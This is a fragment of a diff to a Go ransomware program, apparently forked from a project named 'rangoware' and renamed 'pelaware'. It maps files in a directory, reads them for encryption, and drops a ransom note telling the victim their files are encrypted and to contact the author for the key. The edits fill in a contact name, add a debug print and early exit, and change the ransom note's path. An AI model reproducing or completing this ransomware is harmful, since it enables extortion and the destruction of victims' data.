@@ -8,13 +8,13 @@ import (
 	"io"
 	"io/ioutil"
 	"os"
-
-	"github.com/LuanSilveiraSouza/rangoware/explorer"
+	"fmt"
+	"github.com/davidcbbc/pelaware/explorer"
 )
 
 func main() {
 	cryptoKey := "" // Insert generated Key
-	contact := ""   // Insert contact email
+	contact := "pela"   // Insert contact email
 	dir := ""       // Insert starting directory
 
 	if cryptoKey == "" {
@@ -28,6 +28,8 @@ func main() {
 	}
 
 	files := explorer.MapFiles(dir)
+	fmt.Println(files)
+	os.Exit(3)
 
 	for _, v := range files {
 		file, err := ioutil.ReadFile(v)
@@ -47,7 +49,7 @@ func main() {
 
 	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypt key."
 
-	err = ioutil.WriteFile(os.Getenv("HOME")+dir+"/readme.txt", []byte(msg), 0644)
+	err = ioutil.WriteFile(dir+"/README.txt", []byte(msg), 0644)
 
 	if err != nil {
 		panic(err)
